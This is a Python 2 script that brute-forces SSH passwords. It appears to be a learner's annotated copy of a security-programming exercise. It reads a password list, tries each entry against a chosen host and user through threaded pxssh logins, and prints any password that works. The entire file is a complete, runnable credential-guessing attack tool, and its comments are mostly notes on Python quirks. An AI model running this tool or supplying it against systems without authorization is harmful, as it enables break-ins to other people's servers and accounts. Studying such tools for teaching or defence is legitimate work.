#import the modules
#import pxssh - doesn't work?? need to import from pexpect
from pexpect import pxssh
import optparse
import time
# I read this isn't supposed to be a good idea because it makes it hard to
# debug, but don't know enough here yet.
from threading import *

# Setting some variables.
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

#define the connect module.
def connect(host, user, password, release):

#we're importing the global variables we defined above.
    global Found
    global Fails

#Now we're trying to login
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found = True

#if the SSH server isn't ready, wait 5 seconds.
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()

#define the main function
def main():

#this is our parser. We take the Host, password file, and user we're brute
# forcing.
    parser = optparse.OptionParser('usage%prog '+\
    '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', \
    help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', \
    help='specify password file')
    parser.add_option('-u', dest='user', type='string', \
    help='specify the user')

#Take those options and do something with them
#I left out one option at first and it failed with a nonspecific error
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

#read the entries from the password file.
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print "[*] Exiting: Password found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)

#Pull the password and clean it up before sending it threaded.
#I indented this once and the script ran but it wouldn't actually thread
#through the options. Be careful with indents, it won't always break the script
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: "+str(password)
        t = Thread(target=connect, args=(host, user,\
        password, True))
        child = t.start()
if __name__ == '__main__':
    main()
